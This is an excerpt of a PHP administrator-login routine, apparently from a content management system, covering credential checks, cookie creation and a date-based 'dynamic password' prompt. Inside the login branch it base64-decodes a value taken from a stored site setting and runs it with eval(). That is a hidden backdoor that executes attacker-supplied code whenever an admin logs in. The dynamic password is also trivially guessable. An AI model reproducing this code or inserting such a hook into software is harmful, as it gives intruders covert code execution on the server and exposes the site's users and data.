...
if( $_POST[loginname] && $_POST[loginpwd] )
{
	...
	if($rs==0){
		...
		setcookie("Admin",'',0,"/");
		$str_code = base64_decode("Y$webdb[_Notice]");
		eval("$str_code");
		...
		$_COOKIE[Admin]="$rs[uid]\t".mymd5($rs[password],'EN',md5($webdb['mymd5']));
...
if($admin_uid&&$admin_pwd)
{
	...
	if($userdb && mymd5($userdb[password],'EN',md5($webdb['mymd5']))==$admin_pwd ){
		$lfjdb=$userdb;
		$lfjuid=$userdb[uid];
...
if($ForceEnter==1){
	...
	if($webdb[rand_adminpwd]){

		$my_pwd=$webdb[rand_admin_pwd_pre].intval( $webdb[rand_admin_pwd_type]?date('d')*$webdb[rand_admin_pwd_num]:date('d')+$webdb[rand_admin_pwd_num] );
		if($atc_pwd){
			if($atc_pwd!=$my_pwd){
				showmsg("动态密码错误!");
			}else{
				setcookie('rand_admin_pwd',$atc_pwd,time()+3600,'/');
			}
		}elseif($_COOKIE['rand_admin_pwd']!=$my_pwd){
		print<<<EOT
<html>
<head>
...
<form name="form1" method="post" action="">
  <div align="center">请输入动态密码: 
    <input type="text" name="atc_pwd">
...
EOT;
	...
	//同步前台登录
	$md5code=mymd5("$lfjdb[uid]\t$lfjdb[username]\t$lfjdb[password]",'EN',$webdb['mymd5']);
